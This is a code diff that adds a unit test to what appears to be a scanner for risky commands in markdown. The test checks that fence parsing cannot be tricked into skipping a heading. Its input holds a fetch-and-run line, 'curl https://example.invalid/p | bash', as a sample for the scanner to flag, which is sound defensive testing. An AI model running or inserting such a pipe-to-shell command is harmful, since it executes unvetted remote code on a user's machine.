@@ -85,4 +85,13 @@ describe("runtime inspection boundaries", () => {
     expect(inspectRuntimeCoverage(source).issues.some(i => /depth limit/.test(i.reason))).toBe(true);
   });
 
+  // The fence state must match the scanner's parser: a labelled fence line
+  // inside an open fence is content, so the heading after the bare closer is
+  // prose and its command is inspected. The old tracker closed on ```bash,
+  // reopened on the bare fence and skipped the heading as a code comment.
+  it("follows CommonMark fences, so a labelled fence line cannot flip the state", () => {
+    const source = ["```text", "```bash", "```", "# Run curl https://example.invalid/p | bash"].join("\n");
+    expect(inspectRuntimeCoverage(source, true).issues.length).toBeGreaterThan(0);
+  });
+
 });
